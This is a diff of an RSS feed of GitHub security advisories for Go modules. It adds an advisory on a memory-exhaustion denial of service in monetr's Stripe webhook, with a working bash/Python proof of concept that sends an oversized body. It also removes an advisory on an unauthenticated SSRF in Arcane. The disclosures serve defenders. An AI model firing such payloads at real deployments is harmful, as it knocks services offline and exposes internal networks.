@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-13T23:25:05.624Z</updated>
+    <updated>2026-04-14T00:04:40.745Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,75 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/monetr/monetr] In monetr, unauthenticated Stripe webhook reads attacker-sized request bodies before signature validation]]></title>
+        <id>https://github.com/advisories/GHSA-v7xq-3wx6-fqc2</id>
+        <link href="https://github.com/advisories/GHSA-v7xq-3wx6-fqc2"/>
+        <updated>2026-04-14T00:03:37.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The public Stripe webhook endpoint fully reads the request body into memory before validating the Stripe signature. A remote unauthenticated attacker can send oversized POST bodies and cause substantial memory growth, leading to denial of service.</p>
+<h3 id="details">Details</h3>
+<p>When Stripe webhooks are enabled, the Stripe webhook route is reachable without authentication. The handler only requires that a <code>Stripe-Signature</code> header be present, then buffers the entire request body in memory and only afterward attempts Stripe signature verification.</p>
+<p>Because body buffering happens before signature validation, memory consumption is controlled by the attacker-supplied payload size even when the signature is invalid. Large requests or repeated requests can exhaust available memory and make the service unresponsive or crash.</p>
+<p>This issue depends on Stripe webhooks being enabled. If an upstream proxy or load balancer already enforces a strict request-body limit smaller than the attacker payload, exploitability is reduced accordingly.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-bash">URL="http://127.0.0.1:4000/api/stripe/webhook"
+PROC_NAME="monetr"
+TOTAL_KIB="$(awk '/MemTotal:/ {print $2}' /proc/meminfo)"
+
+python3 - &lt;&lt;'PY' | curl -s -o /dev/null \
+  --limit-rate 10m \
+  -H 'Stripe-Signature: t=1,v1=deadbeef' \
+  --data-binary @- \
+  "$URL" &amp;
+import sys
+sys.stdout.buffer.write(b"A" * (256 * 1024 * 1024))
+PY
+REQ_PID=$!
+
+while kill -0 "$REQ_PID" 2&gt;/dev/null; do
+  ps -C "$PROC_NAME" -o rss=,%cpu= | awk -v total="$TOTAL_KIB" '
+    {
+      printf "%s mem=%.2fMiB / %.3fGiB cpu=%s%%\n", "'"$PROC_NAME"'", $1/1024, total/1024/1024, $2
+    }
+  '
+  sleep 1
+done
+
+wait "$REQ_PID"
+# monetr mem rises substantially while processing the invalid webhook body before signature validation fails
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Type: Denial of service / uncontrolled resource consumption (CWE-400)</li>
+<li>Who is impacted: Internet-reachable monetr deployments that have both Stripe billing and Stripe webhooks enabled
+(Stripe.Enabled and Stripe.WebhooksEnabled). In practice this is the hosted/SaaS configuration. Self-hosted instances
+are very unlikely to be affected, because Stripe billing is opt-in, is not part of a typical self-hosted setup, and
+the webhook route short-circuits to 404 when it is not enabled; meaning the unbounded read is unreachable on a default
+self-hosted deployment.</li>
+<li>Security impact: A remote, unauthenticated attacker can cause the monetr server process to buffer attacker-controlled
+payloads into memory before any signature validation occurs. Sufficiently large or repeated requests can drive memory
+consumption high enough to make the API unresponsive or crash the process, denying service to all legitimate users of
+the affected instance — not just users of the billing surface.</li>
+<li>Attack preconditions: The attacker must be able to reach the /api/stripe/webhook endpoint over the network and the
+target instance must have Stripe webhooks enabled. No authentication, prior account, user interaction, or knowledge of
+the Stripe webhook secret is required. Exploitability is reduced (and may be effectively eliminated) on deployments
+where an upstream proxy or load balancer enforces a request-body size limit smaller than the attacker's payload.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/monetr/monetr/security/advisories/GHSA-v7xq-3wx6-fqc2">https://github.com/monetr/monetr/security/advisories/GHSA-v7xq-3wx6-fqc2</a></li>
+<li><a href="https://github.com/advisories/GHSA-v7xq-3wx6-fqc2">https://github.com/advisories/GHSA-v7xq-3wx6-fqc2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v7xq-3wx6-fqc2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-14T00:03:36.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/enchant97/note-mark/backend] Note Mark has Broken Access Control on Asset Download]]></title>
         <id>https://github.com/advisories/GHSA-p5w6-75f9-cc2p</id>
@@ -1093,49 +1162,5 @@ func main() {
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-04-10T21:00:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend] Arcane has Unauthenticated SSRF with Conditional Response Reflection in Template Fetch Endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-ff24-4prj-gpmj</id>
-        <link href="https://github.com/advisories/GHSA-ff24-4prj-gpmj"/>
-        <updated>2026-04-10T21:37:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The /api/templates/fetch endpoint accepts a caller-supplied url parameter and performs a server-side HTTP GET request to that URL without authentication and without URL scheme or host validation. The server's response is returned directly to the caller. type. This constitutes an unauthenticated SSRF vulnerability affecting any publicly reachable Arcane instance.</p>
-<h3 id="details">Details</h3>
-<ul>
-<li>No allowlist or denylist of destination hosts/CIDRs</li>
-<li>No requirement for the caller to be authenticated</li>
-</ul>
-<p>Response handling produces four distinct outcomes observable by the caller: </p>
-<ul>
-<li>Valid JSON targets return a fully reflected response body if the returned fields fit the expected internal struct</li>
-<li>Non-JSON HTTP 200 responses produce an error leaking the first byte of the response (<code>"Invalid JSON response: invalid character '&lt;'..."</code>)</li>
-<li>Non-200 responses leak the HTTP status code</li>
-<li>TCP-level failures distinguish between closed ports (<code>"connection refused"</code>) and filtered ones (<code>"i/o timeout"</code>)</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Send an unauthenticated GET request to <code>/api/templates/fetch</code>, passing the target URL as the <code>url</code> query parameter.</p>
-<img src="https://github.com/user-attachments/assets/f9fd475e-90b0-4dec-95e1-0af6263f5bb5" alt="image" height="375" width="1041">
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Unauthenticated port scanning of internal networks</li>
-<li>Access to internal HTTP services not exposed to the public internet (service discovery endpoints, internal dashboards, Kubernetes API)</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-ff24-4prj-gpmj">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-ff24-4prj-gpmj</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/releases/tag/v1.17.3">https://github.com/getarcaneapp/arcane/releases/tag/v1.17.3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40242">https://nvd.nist.gov/vuln/detail/CVE-2026-40242</a></li>
-<li><a href="https://github.com/advisories/GHSA-ff24-4prj-gpmj">https://github.com/advisories/GHSA-ff24-4prj-gpmj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ff24-4prj-gpmj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-10T20:59:27.000Z</published>
     </entry>
 </feed>
